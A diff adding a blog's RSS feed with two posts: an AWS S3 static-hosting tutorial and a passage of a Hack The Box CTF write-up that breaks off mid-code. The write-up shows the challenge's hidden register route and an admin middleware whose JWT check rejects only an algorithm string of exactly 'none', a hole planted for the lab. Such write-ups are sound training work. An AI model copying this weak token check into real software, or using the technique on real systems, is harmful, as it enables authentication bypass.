@@ -1,0 +1,967 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on ngaih.tech</title>
+    <link>/posts/</link>
+    <description>Recent content in Posts on ngaih.tech</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 28 Mar 2023 00:00:00 +0000</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Hosting a static site in AWS S3 bucket</title>
+      <link>/posts/statics3/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/statics3/</guid>
+      <description>Static Site A static site refers to a website that is made up of static HTML, CSS, and JavaScript files, which are delivered to the user&amp;rsquo;s web browser exactly as they are stored on the web server. In other words, the content of a static site is fixed and does not change dynamically in response to user input or other external factors.
+Unlike dynamic websites, which rely on server-side processing to generate content on the fly, static sites are pre-built and require no server-side scripting or database access.</description>
+      <content>&lt;h2 id=&#34;static-site&#34;&gt;Static Site&lt;/h2&gt;
+&lt;p&gt;A static site refers to a website that is made up of static HTML, CSS, and JavaScript files, which are delivered to the user&amp;rsquo;s web browser exactly as they are stored on the web server. In other words, the content of a static site is fixed and does not change dynamically in response to user input or other external factors.&lt;/p&gt;
+&lt;p&gt;Unlike dynamic websites, which rely on server-side processing to generate content on the fly, static sites are pre-built and require no server-side scripting or database access. This makes them faster, more secure, and less resource-intensive than dynamic sites, which can be more complex to build and maintain.&lt;/p&gt;
+&lt;p&gt;Static sites are typically used for simple websites that don&amp;rsquo;t require advanced functionality or frequent updates, such as blogs, personal portfolios, or brochure-style websites. They can be hosted on any web server that supports static file hosting, including popular platforms like GitHub Pages, Netlify, or Amazon S3.&lt;/p&gt;
+&lt;h2 id=&#34;amazon-s3&#34;&gt;Amazon S3&lt;/h2&gt;
+&lt;p&gt;Amazon S3 (Simple Storage Service) is a cloud-based object storage service provided by Amazon Web Services (AWS). It allows users to store and retrieve large amounts of data from anywhere on the internet.&lt;/p&gt;
+&lt;p&gt;Amazon S3 provides a simple interface that can be used to store and retrieve any amount of data, at any time, from anywhere on the web. It is designed to be highly scalable, secure, and reliable. S3 is often used as a backend storage service for web and mobile applications, for data backup and archival purposes, and for hosting static websites.&lt;/p&gt;
+&lt;h2 id=&#34;hugo&#34;&gt;Hugo&lt;/h2&gt;
+&lt;p&gt;Hugo is an open-source static site generator written in the Go programming language (Golang). It is designed to be simple, fast, and flexible, allowing users to create static websites quickly and easily.&lt;/p&gt;
+&lt;p&gt;Hugo takes Markdown files, templates, and a configuration file, and generates a static website in HTML, CSS, and JavaScript. It is based on a powerful template engine that allows users to customize the appearance and layout of their websites without having to write complex code.&lt;/p&gt;
+&lt;h3 id=&#34;hosting-this-blog-in-aws-s3&#34;&gt;Hosting this blog in AWS S3&lt;/h3&gt;
+&lt;p&gt;Since this site is just a blog which requires no dynamic content, it is a static site generated using hugo. While this site technically use Amazon Web Services it does not utilise the simple storage service (S3). In this blog post let us migrate the site to S3 bucket.&lt;/p&gt;
+&lt;p&gt;You can migrate any static site to s3 bucket provided that you maintain the same directory structure inside the buckets. This is the directory and file structure of my blog and to host it on the &lt;code&gt;S3&lt;/code&gt; bucket, I just have to upload the files exactly in the same structure.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/statics3/files.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;First let us login to our aws management console, search &lt;code&gt;S3&lt;/code&gt; bucket among the services and then create a s3 bucket. We can leave most of the default options, but create a bucket name, choose the appropriate region for your site (closest to you probably), but make sure to disable &lt;code&gt;block all public access&lt;/code&gt;, but make sure to disable &lt;code&gt;block all public access&lt;/code&gt; and tick the acknowledgement. You can then create the bucket.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/statics3/createbucket.png&#34; alt=&#34;img&#34;&gt;
+&lt;img src=&#34;/images/statics3/disableblock.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After getting redireted to the bucket dashboard click on the newly created bucket.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/statics3/bucket.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now click upload and upload all the files, you can upload multiple files too.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/statics3/addfiles.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Wait for all files to be uploaded. I have slow internet speed so took me quite a while.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/statics3/uploading.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now that all the files have been uploaded go to the properties tab.&lt;/p&gt;
+&lt;p&gt;Enable static website hosting.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/statics3/enablestatic.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Enter the index document and error document if present in your static site files and save changes.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/statics3/enterindex.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now go to the permissions tab to edit a bucket policy. A bucket policy allows us to enable permissions so that our &lt;code&gt;S3&lt;/code&gt; bucket files can be accessed by the public.&lt;/p&gt;
+&lt;p&gt;Add the following lines of json configuration to the policy and save it.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Version&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2012-10-17&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Statement&amp;#34;&lt;/span&gt;: [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Sid&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AllowPublicAccess&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Effect&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Allow&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Principal&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Action&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;s3:GetObject&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Resource&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;arn:aws:s3:::ngaihtech/*&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;sid: Way to identify your policy.&lt;/li&gt;
+&lt;li&gt;Effect: It is either Allow or Deny.&lt;/li&gt;
+&lt;li&gt;Principal: &amp;ldquo;*&amp;rdquo; is a wildcard to allow everyone.&lt;/li&gt;
+&lt;li&gt;Action: &amp;ldquo;s3:GetObject&amp;rdquo; is a verb that allows to read the files from the s3 bucket.&lt;/li&gt;
+&lt;li&gt;Resource: this is a way to identify your bucket, adding &amp;ldquo;/*&amp;rdquo; means giving access to all files inside the bucket.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;/images/statics3/editpolicy.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now that we have given public access to the bucket files. Let us find the url of our bucket to access our hosted static site. Navigate to properties and scroll all the way to the bottom.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/statics3/properties.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Copy that and you can access your hosted static site in s3 using the url.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/statics3/web.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;http://ngaihtech.s3-website.eu-central-1.amazonaws.com&#34;&gt;http://ngaihtech.s3-website.eu-central-1.amazonaws.com&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The link won&amp;rsquo;t probably work anymore.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Now that we have hosted our static site, we can also purchase a domain name and make it point to the url of our s3 bucket.&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>[HTB] Didactic Octo Paddles</title>
+      <link>/posts/didactic/</link>
+      <pubDate>Thu, 23 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/didactic/</guid>
+      <description>This year I participated in Cyber Apocalypse, a CTF organised my hackthebox and managed to solve a few web challenges. Here is my writeup for didactic octo paddles, a medium difficulty web challenge. In this challenge, we are given the luxury of going through the source code of the web application, so it becomes easier to find vulnerabilities in logic errors. Looking at the source code, the web app is written in javascript and utilise nodejs in the backend.</description>
+      <content>&lt;p&gt;This year I participated in Cyber Apocalypse, a CTF organised my hackthebox and managed to solve a few web challenges. Here is my writeup for didactic octo paddles, a medium difficulty web challenge. In this challenge, we are given the luxury of going through the source code of the web application, so it becomes easier to find vulnerabilities in logic errors. Looking at the source code, the web app is written in &lt;code&gt;javascript&lt;/code&gt; and utilise &lt;code&gt;nodejs&lt;/code&gt; in the backend.&lt;/p&gt;
+&lt;p&gt;Navigating to the ip address of the challenge web server we are greeted with a login page, but there is no sight of any other button to click or navigate to.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/didactic/pic1.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Since we have access to the source code, we can see all the routes available in the application and it can be seen that there is a &lt;code&gt;register&lt;/code&gt; route present in the web app. The &lt;code&gt;json&lt;/code&gt; data sent during registering and login is similar with just &lt;code&gt;username&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt; sent in the &lt;code&gt;json&lt;/code&gt;.
+So we can easily capture the login request in a proxy like &lt;code&gt;burp&lt;/code&gt; and send the data to the &lt;code&gt;/register&lt;/code&gt; route and create an account for use.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;router&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/register&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;) =&amp;gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;render&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;register&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    });
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;router&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;post&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/register&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;) =&amp;gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;username&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;username&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;password&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;password&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;username&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;password&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    .&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    .&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Username and password are required&amp;#34;&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;existingUser&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;db&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Users&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;findOne&lt;/span&gt;({
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;username&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;username&lt;/span&gt; },
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            });
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;existingUser&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    .&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    .&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Username already exists&amp;#34;&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;db&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Users&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;create&lt;/span&gt;({
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;username&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;username&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;password&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bcrypt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;hashSync&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;password&lt;/span&gt;),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }).&lt;span style=&#34;color:#a6e22e&#34;&gt;then&lt;/span&gt;(() =&amp;gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;User registered succesfully&amp;#34;&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            });
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;({
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Something went wrong!&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            });
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    });
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/images/didactic/pic2.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now let us login with the user account we have created.
+Username: &lt;code&gt;test&lt;/code&gt; Password: &lt;code&gt;test&lt;/code&gt;.  We are greeted with a page that contains a bunch of paddles which can be added to cart.
+We could spend time and explore all the functionalities of the web app, but since we have access to the source code, we can save a lot of time and not get stuck in any rabbit hole. Observing the code we can see that there is a middleware that handles &lt;code&gt;auth&lt;/code&gt; and &lt;code&gt;admin&lt;/code&gt;. Taking a look at the snippet of code in the &lt;code&gt;admin&lt;/code&gt; middleware.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/didactic/pic3.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;AdminMiddleware&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;) =&amp;gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sessionCookie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;cookies&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;session&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sessionCookie&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;redirect&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/login&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decoded&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;jwt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;decode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sessionCookie&lt;/span&gt;, { &lt;span style=&#34;color:#a6e22e&#34;&gt;complete&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt; });
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;decoded&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;alg&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;none&amp;#39;&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;redirect&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/login&amp;#34;&lt;/span&gt;);
